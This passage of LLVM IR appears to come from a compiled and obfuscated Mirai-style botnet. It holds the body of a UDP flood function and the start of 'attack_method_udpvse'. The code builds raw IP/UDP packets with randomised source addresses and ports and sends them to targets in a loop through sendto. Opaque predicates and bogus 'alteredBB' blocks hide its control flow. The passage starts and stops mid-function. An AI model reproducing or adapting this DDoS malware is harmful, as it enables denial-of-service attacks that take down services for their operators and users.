  %170 = bitcast %struct.iphdr* %169 to i8*
  %171 = load i8, i8* %170, align 4
  %172 = and i8 %171, 15
  %173 = or i8 %172, 64
  store i8 %173, i8* %170, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = bitcast %struct.iphdr* %174 to i8*
  %176 = load i8, i8* %175, align 4
  %177 = and i8 %176, -16
  %178 = or i8 %177, 5
  store i8 %178, i8* %175, align 4
  %179 = load i8, i8* %20, align 1
  %180 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 1
  store i8 %179, i8* %181, align 1
  %182 = load i16, i16* %26, align 2
  %183 = zext i16 %182 to i64
  %184 = add i64 28, %183
  %185 = trunc i64 %184 to i16
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 2
  store i16 %186, i16* %188, align 2
  %189 = load i16, i16* %21, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 3
  store i16 %190, i16* %192, align 4
  %193 = load i8, i8* %22, align 1
  %194 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 5
  store i8 %193, i8* %195, align 4
  %196 = load i8, i8* %23, align 1
  %197 = icmp ne i8 %196, 0
  br i1 %197, label %198, label %202

; <label>:198:                                    ; preds = %154
  %199 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 4
  store i16 %199, i16* %201, align 2
  br label %202

; <label>:202:                                    ; preds = %198, %154
  %203 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 6
  store i8 17, i8* %204, align 1
  %205 = load i32, i32* %28, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 8
  store i32 %205, i32* %207, align 4
  %208 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %209 = load i32, i32* %17, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 1
  %213 = load i32, i32* %212, align 4
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 9
  store i32 %213, i32* %215, align 4
  %216 = load i16, i16* %24, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  store i16 %217, i16* %219, align 2
  %220 = load i16, i16* %25, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %223 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %222, i32 0, i32 1
  store i16 %221, i16* %223, align 2
  %224 = load i16, i16* %26, align 2
  %225 = zext i16 %224 to i64
  %226 = add i64 8, %225
  %227 = trunc i64 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i32 0, i32 2
  store i16 %228, i16* %230, align 2
  br label %231

; <label>:231:                                    ; preds = %202
  %232 = load i32, i32* %17, align 4
  %233 = add nsw i32 %232, 1
  store i32 %233, i32* %17, align 4
  br label %133

; <label>:234:                                    ; preds = %originalBBpart212
  %235 = load i32, i32* @x.33
  %236 = load i32, i32* @y.34
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %234
  %243 = load i32, i32* @x.33
  %244 = load i32, i32* @y.34
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %251

; <label>:251:                                    ; preds = %455, %originalBBpart216
  store i32 0, i32* %17, align 4
  br label %252

; <label>:252:                                    ; preds = %originalBBpart272, %251
  %253 = load i32, i32* %17, align 4
  %254 = load i8, i8* %13, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp slt i32 %253, %255
  br i1 %256, label %257, label %455

; <label>:257:                                    ; preds = %252
  %258 = load i8**, i8*** %19, align 8
  %259 = load i32, i32* %17, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds i8*, i8** %258, i64 %260
  %262 = load i8*, i8** %261, align 8
  store i8* %262, i8** %31, align 8
  %263 = load i8*, i8** %31, align 8
  %264 = bitcast i8* %263 to %struct.iphdr*
  store %struct.iphdr* %264, %struct.iphdr** %32, align 8
  %265 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i64 1
  %267 = bitcast %struct.iphdr* %266 to %struct.udphdr*
  store %struct.udphdr* %267, %struct.udphdr** %33, align 8
  %268 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %269 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %268, i64 1
  %270 = bitcast %struct.udphdr* %269 to i8*
  store i8* %270, i8** %34, align 8
  %271 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %272 = load i32, i32* %17, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %273
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %274, i32 0, i32 2
  %276 = load i8, i8* %275, align 4
  %277 = zext i8 %276 to i32
  %278 = icmp slt i32 %277, 32
  br i1 %278, label %279, label %316

; <label>:279:                                    ; preds = %257
  %280 = load i32, i32* @x.33
  %281 = load i32, i32* @y.34
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %279
  %288 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %289 = load i32, i32* %17, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %291, i32 0, i32 1
  %293 = load i32, i32* %292, align 4
  %294 = call i32 @ntohl(i32 %293) #7
  %295 = call i32 @rand_next()
  %296 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %297 = load i32, i32* %17, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i32 0, i32 2
  %301 = load i8, i8* %300, align 4
  %302 = zext i8 %301 to i32
  %303 = lshr i32 %295, %302
  %304 = add i32 %294, %303
  %305 = call i32 @htonl(i32 %304) #7
  %306 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 9
  store i32 %305, i32* %307, align 4
  %308 = load i32, i32* @x.33
  %309 = load i32, i32* @y.34
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart234, label %originalBB18alteredBB

originalBBpart234:                                ; preds = %originalBB18
  br label %316

; <label>:316:                                    ; preds = %originalBBpart234, %257
  %317 = load i32, i32* %28, align 4
  %318 = icmp eq i32 %317, -1
  br i1 %318, label %319, label %323

; <label>:319:                                    ; preds = %316
  %320 = call i32 @rand_next()
  %321 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 8
  store i32 %320, i32* %322, align 4
  br label %323

; <label>:323:                                    ; preds = %319, %316
  %324 = load i16, i16* %21, align 2
  %325 = zext i16 %324 to i32
  %326 = icmp eq i32 %325, 65535
  br i1 %326, label %327, label %332

; <label>:327:                                    ; preds = %323
  %328 = call i32 @rand_next()
  %329 = trunc i32 %328 to i16
  %330 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 3
  store i16 %329, i16* %331, align 4
  br label %332

; <label>:332:                                    ; preds = %327, %323
  %333 = load i16, i16* %24, align 2
  %334 = zext i16 %333 to i32
  %335 = icmp eq i32 %334, 65535
  br i1 %335, label %336, label %341

; <label>:336:                                    ; preds = %332
  %337 = call i32 @rand_next()
  %338 = trunc i32 %337 to i16
  %339 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 0
  store i16 %338, i16* %340, align 2
  br label %341

; <label>:341:                                    ; preds = %336, %332
  %342 = load i16, i16* %25, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  br i1 %344, label %345, label %350

; <label>:345:                                    ; preds = %341
  %346 = call i32 @rand_next()
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 1
  store i16 %347, i16* %349, align 2
  br label %350

; <label>:350:                                    ; preds = %345, %341
  %351 = load i32, i32* @x.33
  %352 = load i32, i32* @y.34
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %350
  %359 = load i8, i8* %27, align 1
  %360 = icmp ne i8 %359, 0
  %361 = load i32, i32* @x.33
  %362 = load i32, i32* @y.34
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %360, label %369, label %373

; <label>:369:                                    ; preds = %originalBBpart238
  %370 = load i8*, i8** %34, align 8
  %371 = load i16, i16* %26, align 2
  %372 = zext i16 %371 to i32
  call void @rand_str(i8* %370, i32 %372)
  br label %373

; <label>:373:                                    ; preds = %369, %originalBBpart238
  %374 = load i32, i32* @x.33
  %375 = load i32, i32* @y.34
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %373
  %382 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %383 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %382, i32 0, i32 7
  store i16 0, i16* %383, align 2
  %384 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %385 = bitcast %struct.iphdr* %384 to i16*
  %386 = call zeroext i16 @checksum_generic(i16* %385, i32 20)
  %387 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 %386, i16* %388, align 2
  %389 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 3
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %392 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %393 = bitcast %struct.udphdr* %392 to i8*
  %394 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 2
  %396 = load i16, i16* %395, align 2
  %397 = load i16, i16* %26, align 2
  %398 = zext i16 %397 to i64
  %399 = add i64 8, %398
  %400 = trunc i64 %399 to i32
  %401 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %391, i8* %393, i16 zeroext %396, i32 %400)
  %402 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 3
  store i16 %401, i16* %403, align 2
  %404 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 1
  %406 = load i16, i16* %405, align 2
  %407 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %408 = load i32, i32* %17, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i64 %409
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i32 0, i32 0
  %412 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %411, i32 0, i32 1
  store i16 %406, i16* %412, align 2
  %413 = load i32, i32* %18, align 4
  %414 = load i8*, i8** %31, align 8
  %415 = load i16, i16* %26, align 2
  %416 = zext i16 %415 to i64
  %417 = add i64 28, %416
  %418 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %419 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %420 = load i32, i32* %17, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i32 0, i32 0
  %424 = bitcast %struct.sockaddr_in* %423 to %struct.sockaddr*
  store %struct.sockaddr* %424, %struct.sockaddr** %418, align 8
  %425 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %426 = load %struct.sockaddr*, %struct.sockaddr** %425, align 8
  %427 = call i64 @sendto(i32 %413, i8* %414, i64 %417, i32 16384, %struct.sockaddr* %426, i32 16)
  %428 = load i32, i32* @x.33
  %429 = load i32, i32* @y.34
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart258, label %originalBB40alteredBB

originalBBpart258:                                ; preds = %originalBB40
  br label %436

; <label>:436:                                    ; preds = %originalBBpart258
  %437 = load i32, i32* @x.33
  %438 = load i32, i32* @y.34
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %436
  %445 = load i32, i32* %17, align 4
  %446 = add nsw i32 %445, 1
  store i32 %446, i32* %17, align 4
  %447 = load i32, i32* @x.33
  %448 = load i32, i32* @y.34
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBBpart272, label %originalBB60alteredBB

originalBBpart272:                                ; preds = %originalBB60
  br label %252

; <label>:455:                                    ; preds = %252
  br label %251

; <label>:456:                                    ; preds = %113, %107
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %457 = alloca i8, align 1
  %458 = alloca %struct.attack_target*, align 8
  %459 = alloca i8, align 1
  %460 = alloca %struct.attack_option*, align 8
  %461 = alloca i32, align 4
  %462 = alloca i32, align 4
  %463 = alloca i8**, align 8
  %464 = alloca i8, align 1
  %465 = alloca i16, align 2
  %466 = alloca i8, align 1
  %467 = alloca i8, align 1
  %468 = alloca i16, align 2
  %469 = alloca i16, align 2
  %470 = alloca i16, align 2
  %471 = alloca i8, align 1
  %472 = alloca i32, align 4
  %473 = alloca %struct.iphdr*, align 8
  %474 = alloca %struct.udphdr*, align 8
  %475 = alloca i8*, align 8
  %476 = alloca %struct.iphdr*, align 8
  %477 = alloca %struct.udphdr*, align 8
  %478 = alloca i8*, align 8
  %479 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %457, align 1
  store %struct.attack_target* %1, %struct.attack_target** %458, align 8
  store i8 %2, i8* %459, align 1
  store %struct.attack_option* %3, %struct.attack_option** %460, align 8
  %480 = load i8, i8* %457, align 1
  %481 = zext i8 %480 to i64
  %482 = call noalias i8* @calloc(i64 %481, i64 8) #6
  %483 = bitcast i8* %482 to i8**
  store i8** %483, i8*** %463, align 8
  %484 = load i8, i8* %459, align 1
  %485 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %486 = call i32 @attack_get_opt_int(i8 zeroext %484, %struct.attack_option* %485, i8 zeroext 2, i32 0)
  %487 = trunc i32 %486 to i8
  store i8 %487, i8* %464, align 1
  %488 = load i8, i8* %459, align 1
  %489 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %490 = call i32 @attack_get_opt_int(i8 zeroext %488, %struct.attack_option* %489, i8 zeroext 3, i32 65535)
  %491 = trunc i32 %490 to i16
  store i16 %491, i16* %465, align 2
  %492 = load i8, i8* %459, align 1
  %493 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %494 = call i32 @attack_get_opt_int(i8 zeroext %492, %struct.attack_option* %493, i8 zeroext 4, i32 64)
  %495 = trunc i32 %494 to i8
  store i8 %495, i8* %466, align 1
  %496 = load i8, i8* %459, align 1
  %497 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %498 = call i32 @attack_get_opt_int(i8 zeroext %496, %struct.attack_option* %497, i8 zeroext 5, i32 0)
  %499 = trunc i32 %498 to i8
  store i8 %499, i8* %467, align 1
  %500 = load i8, i8* %459, align 1
  %501 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %502 = call i32 @attack_get_opt_int(i8 zeroext %500, %struct.attack_option* %501, i8 zeroext 6, i32 65535)
  %503 = trunc i32 %502 to i16
  store i16 %503, i16* %468, align 2
  %504 = load i8, i8* %459, align 1
  %505 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %506 = call i32 @attack_get_opt_int(i8 zeroext %504, %struct.attack_option* %505, i8 zeroext 7, i32 65535)
  %507 = trunc i32 %506 to i16
  store i16 %507, i16* %469, align 2
  %508 = load i8, i8* %459, align 1
  %509 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %510 = call i32 @attack_get_opt_int(i8 zeroext %508, %struct.attack_option* %509, i8 zeroext 0, i32 512)
  %511 = trunc i32 %510 to i16
  store i16 %511, i16* %470, align 2
  %512 = load i8, i8* %459, align 1
  %513 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %514 = call i32 @attack_get_opt_int(i8 zeroext %512, %struct.attack_option* %513, i8 zeroext 1, i32 1)
  %515 = trunc i32 %514 to i8
  store i8 %515, i8* %471, align 1
  %516 = load i8, i8* %459, align 1
  %517 = load %struct.attack_option*, %struct.attack_option** %460, align 8
  %518 = load i32, i32* @LOCAL_ADDR, align 4
  %519 = call i32 @attack_get_opt_int(i8 zeroext %516, %struct.attack_option* %517, i8 zeroext 25, i32 %518)
  store i32 %519, i32* %472, align 4
  %520 = load i16, i16* %470, align 2
  %521 = zext i16 %520 to i32
  %522 = icmp sgt i32 %521, 1460
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %523 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %523, i32* %18, align 4
  %524 = icmp eq i32 %523, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %116
  store i32 0, i32* %17, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %133
  %525 = load i32, i32* %17, align 4
  %526 = load i8, i8* %13, align 1
  %527 = zext i8 %526 to i32
  %528 = icmp slt i32 %525, %527
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %234
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %279
  %529 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %530 = load i32, i32* %17, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i64 %531
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i32 0, i32 1
  %534 = load i32, i32* %533, align 4
  %535 = call i32 @ntohl(i32 %534) #7
  %536 = call i32 @rand_next()
  %537 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %538 = load i32, i32* %17, align 4
  %539 = sext i32 %538 to i64
  %540 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %537, i64 %539
  %541 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %540, i32 0, i32 2
  %542 = load i8, i8* %541, align 4
  %543 = zext i8 %542 to i32
  %_ = shl i32 %536, %543
  %_19 = shl i32 %536, %543
  %_20 = sub i32 0, %536
  %gen = add i32 %_20, %543
  %_21 = sub i32 0, %536
  %gen22 = add i32 %_21, %543
  %_23 = sub i32 %536, %543
  %gen24 = mul i32 %_23, %543
  %_25 = sub i32 0, %536
  %gen26 = add i32 %_25, %543
  %_27 = sub i32 0, %536
  %gen28 = add i32 %_27, %543
  %_29 = sub i32 0, %536
  %gen30 = add i32 %_29, %543
  %_31 = sub i32 %536, %543
  %gen32 = mul i32 %_31, %543
  %544 = lshr i32 %536, %543
  %545 = add i32 %535, %544
  %546 = call i32 @htonl(i32 %545) #7
  %547 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 9
  store i32 %546, i32* %548, align 4
  br label %originalBB18

originalBB36alteredBB:                            ; preds = %originalBB36, %350
  %549 = load i8, i8* %27, align 1
  %550 = icmp ne i8 %549, 0
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %373
  %551 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %559 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %558, i32 0, i32 3
  store i16 0, i16* %559, align 2
  %560 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %561 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %562 = bitcast %struct.udphdr* %561 to i8*
  %563 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %564 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %563, i32 0, i32 2
  %565 = load i16, i16* %564, align 2
  %566 = load i16, i16* %26, align 2
  %567 = zext i16 %566 to i64
  %_41 = shl i64 8, %567
  %_42 = sub i64 0, 8
  %gen43 = add i64 %_42, %567
  %_44 = sub i64 8, %567
  %gen45 = mul i64 %_44, %567
  %_46 = shl i64 8, %567
  %_47 = sub i64 0, 8
  %gen48 = add i64 %_47, %567
  %_49 = sub i64 8, %567
  %gen50 = mul i64 %_49, %567
  %_51 = shl i64 8, %567
  %_52 = shl i64 8, %567
  %_53 = sub i64 0, 8
  %gen54 = add i64 %_53, %567
  %568 = add i64 8, %567
  %569 = trunc i64 %568 to i32
  %570 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %560, i8* %562, i16 zeroext %565, i32 %569)
  %571 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %572 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %571, i32 0, i32 3
  store i16 %570, i16* %572, align 2
  %573 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %574 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %573, i32 0, i32 1
  %575 = load i16, i16* %574, align 2
  %576 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %577 = load i32, i32* %17, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %576, i64 %578
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %579, i32 0, i32 0
  %581 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %580, i32 0, i32 1
  store i16 %575, i16* %581, align 2
  %582 = load i32, i32* %18, align 4
  %583 = load i8*, i8** %31, align 8
  %584 = load i16, i16* %26, align 2
  %585 = zext i16 %584 to i64
  %_55 = sub i64 28, %585
  %gen56 = mul i64 %_55, %585
  %586 = add i64 28, %585
  %587 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %588 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %589 = load i32, i32* %17, align 4
  %590 = sext i32 %589 to i64
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %588, i64 %590
  %592 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %591, i32 0, i32 0
  %593 = bitcast %struct.sockaddr_in* %592 to %struct.sockaddr*
  store %struct.sockaddr* %593, %struct.sockaddr** %587, align 8
  %594 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %595 = load %struct.sockaddr*, %struct.sockaddr** %594, align 8
  %596 = call i64 @sendto(i32 %582, i8* %583, i64 %586, i32 16384, %struct.sockaddr* %595, i32 16)
  br label %originalBB40

originalBB60alteredBB:                            ; preds = %originalBB60, %436
  %597 = load i32, i32* %17, align 4
  %_61 = shl i32 %597, 1
  %_62 = shl i32 %597, 1
  %_63 = shl i32 %597, 1
  %_64 = sub i32 0, %597
  %gen65 = add i32 %_64, 1
  %_66 = sub i32 0, %597
  %gen67 = add i32 %_66, 1
  %_68 = shl i32 %597, 1
  %_69 = sub i32 %597, 1
  %gen70 = mul i32 %_69, 1
  %598 = add nsw i32 %597, 1
  store i32 %598, i32* %17, align 4
  br label %originalBB60
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
